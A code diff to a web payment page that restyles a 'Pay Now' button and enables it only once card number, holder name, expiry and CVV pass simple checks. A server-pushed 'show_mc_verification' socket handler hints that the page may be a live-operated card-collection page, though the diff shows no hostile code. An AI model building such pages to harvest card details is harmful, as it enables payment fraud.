@@ -163,49 +163,52 @@ body {
             padding-left: 1.5rem;
         }
         
-       /* Find your existing pay-now-btn style and modify/add these properties */
+/* Updated pay-now-btn styles to prevent any color change */
 .pay-now-btn {
-    background-color: #a0aec0; /* Start with silver/gray */
+    background-color: #a0aec0 !important; /* Silver/gray with !important to override */
     color: white;
     font-weight: 600;
     font-size: 16px;
     padding: 0.75rem;
     border-radius: 0.375rem;
     width: 100%;
-    transition: background-color 0.3s ease; /* Only transition the background color */
     border: none;
-    cursor: not-allowed; /* Show "not allowed" cursor when disabled */
+    cursor: not-allowed;
     height: 52px;
     box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
     text-transform: uppercase;
     letter-spacing: 0.025em;
+    /* Remove any transitions */
+    transition: none;
+    /* Prevent any default browser styles */
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
 }
 
-/* Remove or modify these hover/active styles */
-.pay-now-btn:hover {
-    background-color: inherit; /* Don't change color on hover */
-    transform: none; /* Don't move button on hover */
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* Keep shadow the same */
-}
-
+/* Completely disable hover effects */
+.pay-now-btn:hover,
+.pay-now-btn:focus,
 .pay-now-btn:active {
-    transform: none; /* Don't move button when clicked */
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* Keep shadow the same */
+    background-color: #a0aec0 !important; /* Keep silver color always */
+    transform: none !important;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2) !important;
+    outline: none !important;
+    color: white !important;
 }
 
-/* Add a style for the enabled state */
-.pay-now-btn.enabled {
-    background-color: #1a5e32; /* Dark green when enabled */
-    cursor: pointer;
+/* Add a separate class for enabled state that will be applied with JavaScript */
+.pay-now-btn.pay-enabled {
+    background-color: #1a5e32 !important; /* Dark green */
+    cursor: pointer !important;
 }
 
-/* Keep the same shadow and prevent animation for enabled buttons too */
-.pay-now-btn.enabled:hover,
-.pay-now-btn.enabled:active {
-    transform: none;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+/* Keep green color even on hover/active when enabled */
+.pay-now-btn.pay-enabled:hover,
+.pay-now-btn.pay-enabled:focus,
+.pay-now-btn.pay-enabled:active {
+    background-color: #1a5e32 !important; /* Keep dark green */
 }
-        
         /* Input icons - IMPROVED positioning */
         .input-icon {
             position: absolute;
@@ -484,7 +487,7 @@ body {
                 <!-- Right Side - Card Details -->
                 <div class="card-details-section md:w-1/2">
                     <h2>Card Details</h2>
-                    <form id="card-form" class="space-y-4">
+                    <form id="card-form" class="space-y-4" onsubmit="return false;">
                         <div class="form-group">
                             <label>Card Number</label>
                             <div class="relative">
@@ -991,36 +994,52 @@ socket.on('show_mc_verification', (data) => {
     });
 }
 
-    // Add this function to your JavaScript code
+// Improved function to update the Pay Now button
 function updatePayNowButton() {
-    const cardNumber = document.getElementById('card-number')?.value;
-    const cardHolder = document.getElementById('card-holder')?.value;
-    const expiryDate = document.getElementById('expiry-date')?.value;
-    const cvv = document.getElementById('cvv')?.value;
+    const cardNumber = document.getElementById('card-number')?.value || '';
+    const cardHolder = document.getElementById('card-holder')?.value || '';
+    const expiryDate = document.getElementById('expiry-date')?.value || '';
+    const cvv = document.getElementById('cvv')?.value || '';
     const payNowBtn = document.querySelector('.pay-now-btn');
     
-    if (payNowBtn) {
-        // Check if all fields are filled
-        if (cardNumber && cardNumber.replace(/\s/g, '').length >= 16 && 
-            cardHolder && cardHolder.trim().length > 0 && 
-            expiryDate && /^\d{2}\/\d{2}$/.test(expiryDate) && 
-            cvv && cvv.length >= 3) {
+    if (!payNowBtn) return;
+    
+    // Remove all event listeners from the button first
+    const newPayBtn = payNowBtn.cloneNode(true);
+    payNowBtn.parentNode.replaceChild(newPayBtn, payNowBtn);
+    
+    // Check if all fields are filled with valid data
+    const isCardNumberValid = cardNumber.replace(/\s/g, '').length >= 16;
+    const isCardHolderValid = cardHolder.trim().length > 0;
+    const isExpiryDateValid = /^\d{2}\/\d{2}$/.test(expiryDate);
+    const isCvvValid = cvv.length >= 3;
+    
+    if (isCardNumberValid && isCardHolderValid && isExpiryDateValid && isCvvValid) {
+        // Enable button and change to green
+        newPayBtn.disabled = false;
+        newPayBtn.classList.add('pay-enabled');
+        
+        // Add click event only when enabled
+        newPayBtn.addEventListener('click', function(e) {
+            // Prevent default to avoid any browser styling
+            e.preventDefault();
             
-            // Enable button and change color to dark green
-            payNowBtn.disabled = false;
-            payNowBtn.style.backgroundColor = '#1a5e32'; // Dark green
-            payNowBtn.style.cursor = 'pointer';
-            payNowBtn.classList.add('enabled');
-        } else {
-            // Disable button and keep silver/gray
-            payNowBtn.disabled = true;
-            payNowBtn.style.backgroundColor = '#a0aec0'; // Silver/gray
-            payNowBtn.style.cursor = 'not-allowed';
-            payNowBtn.classList.remove('enabled');
-        }
+            // Process the payment
+            handleCardSubmit(e);
+        });
+    } else {
+        // Keep button disabled and silver
+        newPayBtn.disabled = true;
+        newPayBtn.classList.remove('pay-enabled');
+        
+        // Add a click event that does nothing but prevents default behavior
+        newPayBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Do nothing
+            return false;
+        });
     }
 }
-
 // Add this to your setupCardFormHandlers function
 function setupCardFormHandlers() {
     // Your existing code...
